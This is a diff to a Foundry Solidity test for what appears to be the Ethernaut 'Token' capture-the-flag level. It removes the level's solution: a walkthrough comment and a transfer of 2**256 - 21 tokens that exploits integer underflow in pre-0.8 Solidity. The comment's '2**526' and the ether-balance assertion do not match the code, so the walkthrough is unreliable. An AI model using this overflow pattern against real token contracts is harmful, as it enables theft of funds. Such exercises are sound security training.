@@ -29,18 +29,6 @@ contract TokenTest is Test {
         /****************
          *    Attack     *
          *************** */
-        /*
-         * Walkthrough:
-         * For this level we can use 2 addresses
-         * default _initialSupply is set to 20
-         * we want to transfer an amount of token  2**526 causing overflow
-         */
-        // this level is a classic example of overflow, which is now prevented by default in Sol ^8.0.0
-        vm.startPrank(player2);
-        ethernautToken.transfer(player, 2**256 - 21);
-        vm.stopPrank();
-        vm.startPrank(player);
-        assertEq(address(ethernautToken).balance, 0);
 
         /*****************
          *Level Submission*
